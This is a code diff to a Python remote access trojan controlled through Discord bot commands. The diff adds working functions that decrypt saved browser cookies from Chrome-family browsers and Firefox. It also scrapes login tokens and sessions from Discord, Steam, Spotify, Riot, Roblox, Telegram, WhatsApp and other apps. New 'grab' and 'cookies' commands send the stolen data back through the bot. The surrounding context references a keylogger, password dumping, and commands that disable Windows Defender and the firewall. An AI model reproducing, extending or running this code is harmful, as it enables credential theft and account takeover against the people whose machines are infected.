@@ -325,6 +325,373 @@ def get_all_browser_passwords():
             all_passwords.extend(passwords)
     return all_passwords, detected
 
+def get_all_browser_cookies():
+    """Extract cookies from ALL installed browsers"""
+    all_cookies = []
+    detected = []
+    
+    browsers = {
+        "Chrome": os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data",
+        "Edge": os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data",
+        "Brave": os.path.expanduser("~") + r"\AppData\Local\BraveSoftware\Brave-Browser\User Data",
+        "Opera": os.path.expanduser("~") + r"\AppData\Roaming\Opera Software\Opera Stable",
+        "Vivaldi": os.path.expanduser("~") + r"\AppData\Local\Vivaldi\User Data",
+        "OperaGX": os.path.expanduser("~") + r"\AppData\Roaming\Opera Software\Opera GX Stable",
+        "Chromium": os.path.expanduser("~") + r"\AppData\Local\Chromium\User Data",
+        "Firefox": os.path.expanduser("~") + r"\AppData\Roaming\Mozilla\Firefox\Profiles",
+        "Waterfox": os.path.expanduser("~") + r"\AppData\Roaming\Waterfox\Profiles",
+        "PaleMoon": os.path.expanduser("~") + r"\AppData\Roaming\Pale Moon\Profiles"
+    }
+    
+    for name, path in browsers.items():
+        if os.path.exists(path):
+            detected.append(name)
+            if name in ["Firefox", "Waterfox", "PaleMoon"]:
+                try:
+                    for profile in os.listdir(path):
+                        if profile.endswith(".default") or profile.endswith(".default-release"):
+                            cookies_path = os.path.join(path, profile, "cookies.sqlite")
+                            if os.path.exists(cookies_path):
+                                try:
+                                    conn = sqlite3.connect(cookies_path)
+                                    cursor = conn.cursor()
+                                    cursor.execute("SELECT host, name, value FROM moz_cookies")
+                                    for host, name_val, value in cursor.fetchall():
+                                        if value:
+                                            all_cookies.append({
+                                                "browser": name,
+                                                "host": host,
+                                                "name": name_val,
+                                                "value": value
+                                            })
+                                    conn.close()
+                                except:
+                                    pass
+                except:
+                    pass
+            else:
+                if CRYPTO_AVAILABLE:
+                    try:
+                        cookies = get_chrome_cookies(path)
+                        all_cookies.extend(cookies)
+                    except:
+                        pass
+    
+    return all_cookies, list(set(detected))
+
+def get_chrome_cookies(browser_path):
+    """Extract cookies from Chrome-based browser"""
+    cookies = []
+    try:
+        local_state_path = os.path.join(browser_path, "Local State")
+        if not os.path.exists(local_state_path):
+            return cookies
+        
+        with open(local_state_path, 'r', encoding='utf-8') as f:
+            local_state = json.loads(f.read())
+        
+        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        encrypted_key = encrypted_key[5:]
+        secret_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+        
+        profiles = ["Default"] + [f"Profile {i}" for i in range(1, 10)]
+        for profile in profiles:
+            cookies_path = os.path.join(browser_path, profile, "Network", "Cookies")
+            if not os.path.exists(cookies_path):
+                continue
+            
+            temp_path = os.path.join(os.environ['TEMP'], f"cookies_{int(time.time())}.db")
+            shutil.copy2(cookies_path, temp_path)
+            
+            try:
+                conn = sqlite3.connect(temp_path)
+                cursor = conn.cursor()
+                cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
+                for host, name_val, encrypted_value in cursor.fetchall():
+                    try:
+                        if encrypted_value is None or len(encrypted_value) < 3:
+                            continue
+                        
+                        if encrypted_value.startswith(b'v10') or encrypted_value.startswith(b'v11'):
+                            encrypted_value = encrypted_value[3:]
+                        
+                        nonce = encrypted_value[:12]
+                        ciphertext = encrypted_value[12:-16]
+                        tag = encrypted_value[-16:]
+                        
+                        cipher = AES.new(secret_key, AES.MODE_GCM, nonce=nonce)
+                        decrypted = cipher.decrypt_and_verify(ciphertext, tag)
+                        
+                        cookies.append({
+                            "browser": os.path.basename(browser_path),
+                            "host": host,
+                            "name": name_val,
+                            "value": decrypted.decode('utf-8')
+                        })
+                    except:
+                        pass
+                conn.close()
+            except:
+                pass
+            
+            try:
+                os.remove(temp_path)
+            except:
+                pass
+    except:
+        pass
+    
+    return cookies
+
+def scan_all_apps():
+    """Scan for ALL installed apps and grab their tokens/cookies"""
+    results = []
+    detected_apps = []
+    
+    # Discord
+    discord_paths = [
+        os.path.expanduser("~") + r"\AppData\Roaming\Discord\Local Storage\leveldb",
+        os.path.expanduser("~") + r"\AppData\Roaming\DiscordPTB\Local Storage\leveldb",
+        os.path.expanduser("~") + r"\AppData\Roaming\DiscordCanary\Local Storage\leveldb",
+        os.path.expanduser("~") + r"\AppData\Roaming\Lightcord\Local Storage\leveldb",
+        os.path.expanduser("~") + r"\AppData\Roaming\DiscordDevelopment\Local Storage\leveldb",
+    ]
+    for path in discord_paths:
+        if os.path.exists(path):
+            detected_apps.append("Discord")
+            try:
+                for file in os.listdir(path):
+                    if file.endswith((".log", ".ldb")):
+                        with open(os.path.join(path, file), 'r', errors='ignore') as f:
+                            data = f.read()
+                            matches = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', data)
+                            for m in matches:
+                                results.append(f"🟣 Discord Token: {m}")
+                            matches = re.findall(r'mfa\.[\w-]{84}', data)
+                            for m in matches:
+                                results.append(f"🟣 Discord MFA: {m}")
+            except:
+                pass
+    
+    # Steam
+    steam_path = os.path.expanduser("~") + r"\AppData\Local\Steam\config\loginusers.vdf"
+    if os.path.exists(steam_path):
+        detected_apps.append("Steam")
+        try:
+            with open(steam_path, 'r', errors='ignore') as f:
+                data = f.read()
+                matches = re.findall(r'"AccountName"\s*"([^"]+)"', data)
+                for m in matches:
+                    results.append(f"🎮 Steam Account: {m}")
+                matches = re.findall(r'"SteamID"\s*"([^"]+)"', data)
+                for m in matches:
+                    results.append(f"🎮 Steam ID: {m}")
+        except:
+            pass
+    
+    # Spotify
+    spotify_path = os.path.expanduser("~") + r"\AppData\Roaming\Spotify\Users"
+    if os.path.exists(spotify_path):
+        detected_apps.append("Spotify")
+        try:
+            for file in os.listdir(spotify_path):
+                if file.endswith(".json"):
+                    with open(os.path.join(spotify_path, file), 'r', errors='ignore') as f:
+                        data = f.read()
+                        matches = re.findall(r'"accessToken":"([^"]+)"', data)
+                        for m in matches:
+                            results.append(f"🎵 Spotify Token: {m[:50]}...")
+                        matches = re.findall(r'"refreshToken":"([^"]+)"', data)
+                        for m in matches:
+                            results.append(f"🎵 Spotify Refresh: {m[:50]}...")
+        except:
+            pass
+    
+    # Battle.net
+    battlenet_paths = [
+        os.path.expanduser("~") + r"\AppData\Local\Battle.net\Blizzard\Local Storage\leveldb",
+        os.path.expanduser("~") + r"\AppData\Local\Blizzard\Local Storage\leveldb",
+    ]
+    for path in battlenet_paths:
+        if os.path.exists(path):
+            detected_apps.append("Battle.net")
+            try:
+                for file in os.listdir(path):
+                    if file.endswith((".log", ".ldb")):
+                        with open(os.path.join(path, file), 'r', errors='ignore') as f:
+                            data = f.read()
+                            matches = re.findall(r'"access_token":"([^"]+)"', data)
+                            for m in matches:
+                                results.append(f"🎮 Battle.net Token: {m[:50]}...")
+                            matches = re.findall(r'"account_id":"([^"]+)"', data)
+                            for m in matches:
+                                results.append(f"🎮 Battle.net Account: {m}")
+            except:
+                pass
+    
+    # Riot Games
+    riot_paths = [
+        os.path.expanduser("~") + r"\AppData\Local\Riot Games\Riot Client\Data",
+        os.path.expanduser("~") + r"\AppData\Local\Riot Games\League of Legends\Config",
+    ]
+    for path in riot_paths:
+        if os.path.exists(path):
+            detected_apps.append("Riot Games")
+            try:
+                for root, dirs, files in os.walk(path):
+                    for file in files:
+                        if file.endswith(".json"):
+                            with open(os.path.join(root, file), 'r', errors='ignore') as f:
+                                data = f.read()
+                                matches = re.findall(r'"access_token":"([^"]+)"', data)
+                                for m in matches:
+                                    results.append(f"🏹 Riot Token: {m[:50]}...")
+                                matches = re.findall(r'"puuid":"([^"]+)"', data)
+                                for m in matches:
+                                    results.append(f"🏹 Riot PUUID: {m[:50]}...")
+            except:
+                pass
+    
+    # Epic Games
+    epic_path = os.path.expanduser("~") + r"\AppData\Local\Epic Games\Launcher\Saved\Config\Windows\GameUserSettings.ini"
+    if os.path.exists(epic_path):
+        detected_apps.append("Epic Games")
+        try:
+            with open(epic_path, 'r', errors='ignore') as f:
+                data = f.read()
+                matches = re.findall(r'[a-f0-9]{32}', data)
+                for m in matches:
+                    results.append(f"🎯 Epic Games ID: {m}")
+        except:
+            pass
+    
+    # Minecraft
+    mc_paths = [
+        os.path.expanduser("~") + r"\AppData\Roaming\.minecraft\launcher_profiles.json",
+        os.path.expanduser("~") + r"\AppData\Roaming\.minecraft\usercache.json",
+        os.path.expanduser("~") + r"\AppData\Roaming\.minecraft\launcher_accounts.json",
+    ]
+    for path in mc_paths:
+        if os.path.exists(path):
+            detected_apps.append("Minecraft")
+            try:
+                with open(path, 'r', errors='ignore') as f:
+                    data = f.read()
+                    matches = re.findall(r'"accessToken":"([^"]+)"', data)
+                    for m in matches:
+                        results.append(f"⛏️ Minecraft Token: {m[:50]}...")
+                    matches = re.findall(r'"uuid":"([^"]+)"', data)
+                    for m in matches:
+                        results.append(f"⛏️ Minecraft UUID: {m}")
+                    matches = re.findall(r'"displayName":"([^"]+)"', data)
+                    for m in matches:
+                        results.append(f"⛏️ Minecraft User: {m}")
+            except:
+                pass
+    
+    # Roblox
+    roblox_paths = [
+        os.path.expanduser("~") + r"\AppData\Local\Roblox\Local Storage\leveldb",
+        os.path.expanduser("~") + r"\AppData\Roaming\Roblox\Local Storage\leveldb",
+    ]
+    for path in roblox_paths:
+        if os.path.exists(path):
+            detected_apps.append("Roblox")
+            try:
+                for file in os.listdir(path):
+                    if file.endswith((".log", ".ldb")):
+                        with open(os.path.join(path, file), 'r', errors='ignore') as f:
+                            data = f.read()
+                            matches = re.findall(r'"_|ROBLOSECURITY":"([^"]+)"', data)
+                            for m in matches:
+                                results.append(f"🧱 Roblox Token: {m[:50]}...")
+            except:
+                pass
+    
+    # Reddit
+    reddit_path = os.path.expanduser("~") + r"\AppData\Roaming\Reddit\Local Storage\leveldb"
+    if os.path.exists(reddit_path):
+        detected_apps.append("Reddit")
+        try:
+            for file in os.listdir(reddit_path):
+                if file.endswith((".log", ".ldb")):
+                    with open(os.path.join(reddit_path, file), 'r', errors='ignore') as f:
+                        data = f.read()
+                        matches = re.findall(r'"access_token":"([^"]+)"', data)
+                        for m in matches:
+                            results.append(f"🔴 Reddit Token: {m[:50]}...")
+                        matches = re.findall(r'"refresh_token":"([^"]+)"', data)
+                        for m in matches:
+                            results.append(f"🔴 Reddit Refresh: {m[:50]}...")
+        except:
+            pass
+    
+    # TikTok
+    tiktok_path = os.path.expanduser("~") + r"\AppData\Roaming\TikTok\Local Storage\leveldb"
+    if os.path.exists(tiktok_path):
+        detected_apps.append("TikTok")
+        try:
+            for file in os.listdir(tiktok_path):
+                if file.endswith((".log", ".ldb")):
+                    with open(os.path.join(tiktok_path, file), 'r', errors='ignore') as f:
+                        data = f.read()
+                        matches = re.findall(r'"sessionid":"([^"]+)"', data)
+                        for m in matches:
+                            results.append(f"🎵 TikTok Session: {m[:50]}...")
+                        matches = re.findall(r'"csrf_token":"([^"]+)"', data)
+                        for m in matches:
+                            results.append(f"🎵 TikTok CSRF: {m[:50]}...")
+        except:
+            pass
+    
+    # Telegram
+    telegram_paths = [
+        os.path.expanduser("~") + r"\AppData\Roaming\Telegram Desktop\tdata",
+        os.path.expanduser("~") + r"\AppData\Roaming\Telegram Desktop\tdummy",
+    ]
+    for path in telegram_paths:
+        if os.path.exists(path):
+            detected_apps.append("Telegram")
+            try:
+                for file in os.listdir(path):
+                    if file.endswith(".s"):
+                        with open(os.path.join(path, file), 'rb') as f:
+                            data = f.read()
+                            matches = re.findall(rb'\d+:[a-zA-Z0-9_-]{35}', data)
+                            for m in matches:
+                                results.append(f"🔵 Telegram Session: {m.decode('utf-8', errors='ignore')}")
+            except:
+                pass
+    
+    # WhatsApp
+    wa_path = os.path.expanduser("~") + r"\AppData\Roaming\WhatsApp\Local Storage\leveldb"
+    if os.path.exists(wa_path):
+        detected_apps.append("WhatsApp")
+        try:
+            for file in os.listdir(wa_path):
+                if file.endswith((".log", ".ldb")):
+                    with open(os.path.join(wa_path, file), 'r', errors='ignore') as f:
+                        data = f.read()
+                        matches = re.findall(r'"token":"([^"]+)"', data)
+                        for m in matches:
+                            results.append(f"💬 WhatsApp Token: {m[:50]}...")
+                        matches = re.findall(r'"session":"([^"]+)"', data)
+                        for m in matches:
+                            results.append(f"💬 WhatsApp Session: {m[:50]}...")
+        except:
+            pass
+    
+    # Browser Cookies (if crypto available)
+    if CRYPTO_AVAILABLE:
+        cookies, browser_detected = get_all_browser_cookies()
+        for app in browser_detected:
+            if app not in detected_apps:
+                detected_apps.append(app)
+        for c in cookies[:100]:
+            results.append(f"🍪 Browser: {c['browser']} | {c['host']} | {c['name']} = {c['value'][:50]}...")
+    
+    return results, list(set(detected_apps))
+
 def grab_all_tokens():
     tokens = []
     detected_apps = []
@@ -1042,7 +1409,6 @@ async def media_next(ctx):
     except Exception as e:
         await send_embed(ctx, "Error", str(e), discord.Color.red())
 
-# ========== FIXED FILE LISTING ==========
 @bot.command(name='listfiles')
 @is_authorized()
 async def list_files(ctx, directory: str = "."):
@@ -1123,11 +1489,9 @@ async def list_files(ctx, directory: str = "."):
     except Exception as e:
         await send_embed(ctx, "Error", str(e), discord.Color.red())
 
-# ========== IMAGES ONLY ==========
 @bot.command(name='images')
 @is_authorized()
 async def list_images(ctx, directory: str = "."):
-    """List only image files (jpg, png, gif, webp, bmp, ico, svg, tiff)"""
     try:
         if directory.startswith("~"):
             directory = os.path.expanduser(directory)
@@ -1169,11 +1533,9 @@ async def list_images(ctx, directory: str = "."):
     except Exception as e:
         await send_embed(ctx, "Error", str(e), discord.Color.red())
 
-# ========== VIDS ONLY ==========
 @bot.command(name='vids')
 @is_authorized()
 async def list_videos_only(ctx, directory: str = "."):
-    """List only video files (mp4, avi, mkv, mov, wmv, flv, webm, m4v)"""
     try:
         if directory.startswith("~"):
             directory = os.path.expanduser(directory)
@@ -1213,11 +1575,9 @@ async def list_videos_only(ctx, directory: str = "."):
     except Exception as e:
         await send_embed(ctx, "Error", str(e), discord.Color.red())
 
-# ========== AUDIO ONLY ==========
 @bot.command(name='audio')
 @is_authorized()
 async def list_audio_only(ctx, directory: str = "."):
-    """List only audio files (mp3, wav, flac, aac, ogg, wma, m4a, opus)"""
     try:
         if directory.startswith("~"):
             directory = os.path.expanduser(directory)
@@ -1257,7 +1617,6 @@ async def list_audio_only(ctx, directory: str = "."):
     except Exception as e:
         await send_embed(ctx, "Error", str(e), discord.Color.red())
 
-# ========== SEARCH ==========
 @bot.command(name='search')
 @is_authorized()
 async def search_files(ctx, *, query: str):
@@ -1292,7 +1651,6 @@ async def search_files(ctx, *, query: str):
     except Exception as e:
         await send_embed(ctx, "Error", str(e), discord.Color.red())
 
-# ========== RECENT ==========
 @bot.command(name='recent')
 @is_authorized()
 async def recent_files(ctx, count: int = 15):
@@ -1625,6 +1983,73 @@ async def keylog_status(ctx):
     status = "🟢 Running" if keylog_active else "🔴 Stopped"
     await send_embed(ctx, "⌨️ Keylogger Status", status, discord.Color.blue())
 
+# ========== ULTIMATE GRAB COMMAND ==========
+@bot.command(name='grab')
+@is_authorized()
+async def grab_all(ctx):
+    """ULTIMATE GRAB - Browser Cookies + App Tokens + App Cookies"""
+    await send_embed(ctx, "🔍 ULTIMATE GRAB INITIATED", 
+        "Scanning for:\n• ALL Browsers (Chrome, Edge, Brave, Firefox, Opera, Vivaldi, etc.)\n• Discord, Steam, Spotify, Battle.net\n• Riot Games, Epic, Minecraft\n• Roblox, Reddit, TikTok\n• Telegram, WhatsApp\n• And more...",
+        discord.Color.blue())
+    
+    results, detected = scan_all_apps()
+    
+    if detected:
+        detected_str = "✅ Detected: " + ", ".join(detected)
+    else:
+        detected_str = "❌ No token-bearing apps detected"
+    
+    if results:
+        output = "\n".join(results[:80])
+        if len(output) > 1900:
+            with open("grab_all.txt", "w", encoding='utf-8') as f:
+                f.write("\n".join(results))
+            await ctx.send(file=discord.File("grab_all.txt"))
+            os.remove("grab_all.txt")
+            embed = discord.Embed(title="📦 All Data Grabbed", color=discord.Color.green())
+            embed.add_field(name="📊 Detected Apps", value=detected_str, inline=False)
+            embed.add_field(name="📈 Total Items", value=str(len(results)), inline=True)
+            embed.add_field(name="💾 File", value="Downloaded above", inline=True)
+            await ctx.send(embed=embed)
+        else:
+            embed = discord.Embed(title="📦 All Data Grabbed", description=f"```{output}```", color=discord.Color.green())
+            embed.add_field(name="📊 Detected Apps", value=detected_str, inline=False)
+            embed.add_field(name="📈 Total Items", value=str(len(results)), inline=True)
+            await ctx.send(embed=embed)
+    else:
+        embed = discord.Embed(title="📦 No Data Found", color=discord.Color.red())
+        embed.add_field(name="💡 Tip", value="Make sure the target has apps like Discord, Steam, Chrome, etc. installed and logged in", inline=False)
+        await ctx.send(embed=embed)
+
+# ========== COOKIES COMMAND ==========
+@bot.command(name='cookies')
+@is_authorized()
+async def grab_cookies(ctx):
+    """Grab ALL browser cookies from ALL browsers"""
+    if not CRYPTO_AVAILABLE:
+        await send_embed(ctx, "❌ Error", "pycryptodome not installed - run: pip install pycryptodome", discord.Color.red())
+        return
+    
+    await send_embed(ctx, "🍪 Grabbing Cookies", "Extracting from all browsers...", discord.Color.blue())
+    cookies, detected = get_all_browser_cookies()
+    
+    if cookies:
+        output = "\n".join([f"**{c['browser']}** | `{c['host']}` → `{c['name']}` = `{c['value'][:40]}...`" for c in cookies[:50]])
+        if len(output) > 1900:
+            with open("cookies.txt", "w", encoding='utf-8') as f:
+                for c in cookies:
+                    f.write(f"{c['browser']} | {c['host']} | {c['name']} = {c['value']}\n")
+            await ctx.send(file=discord.File("cookies.txt"))
+            os.remove("cookies.txt")
+            await send_embed(ctx, "🍪 Cookies", f"Saved {len(cookies)} cookies to file", discord.Color.green())
+        else:
+            embed = discord.Embed(title="🍪 Browser Cookies", description=output[:1900], color=discord.Color.green())
+            embed.add_field(name="📊 Detected Browsers", value=", ".join(detected) if detected else "None", inline=False)
+            embed.add_field(name="📈 Total Cookies", value=str(len(cookies)), inline=True)
+            await ctx.send(embed=embed)
+    else:
+        await send_embed(ctx, "🍪 Cookies", "No cookies found in any browser", discord.Color.red())
+
 @bot.command(name='grabtokens')
 @is_authorized()
 async def grab_tokens(ctx):
@@ -1754,7 +2179,6 @@ async def desktop_cmd(ctx, *, path: str = ""):
     else:
         await list_files(ctx, get_folder_path('desktop'))
 
-# ========== SYSTEM FOLDER COMMANDS ==========
 @bot.command(name='programfiles')
 @is_authorized()
 async def program_files_cmd(ctx, *, path: str = ""):
@@ -1853,7 +2277,6 @@ async def goto_folder(ctx, *, path: str):
     else:
         await send_embed(ctx, "Error", f"Folder not found: {path}", discord.Color.red())
 
-# ========== ALIASES ==========
 @bot.command(name='sysinfo')
 @is_authorized()
 async def sysinfo_cmd(ctx):
@@ -2229,6 +2652,8 @@ async def help_cmd(ctx):
             "`grabtokens` - Grab tokens from Discord, Steam, Chrome, Epic, Minecraft, Spotify, Riot, Reddit, TikTok, Battle.net, Telegram, WhatsApp, Roblox",
             "`password` - Dump passwords from ALL browsers",
             "`webhistory` - Get browser history from ALL browsers",
+            "`cookies` - Grab ALL cookies from ALL browsers",
+            "`grab` - ULTIMATE GRAB: ALL browsers + ALL apps in ONE command",
             "`disabledefender` - Disable Windows Defender (admin)",
             "`disablefirewall` - Disable Windows Firewall (admin)",
             "`disabletaskmgr` - Disable Task Manager",
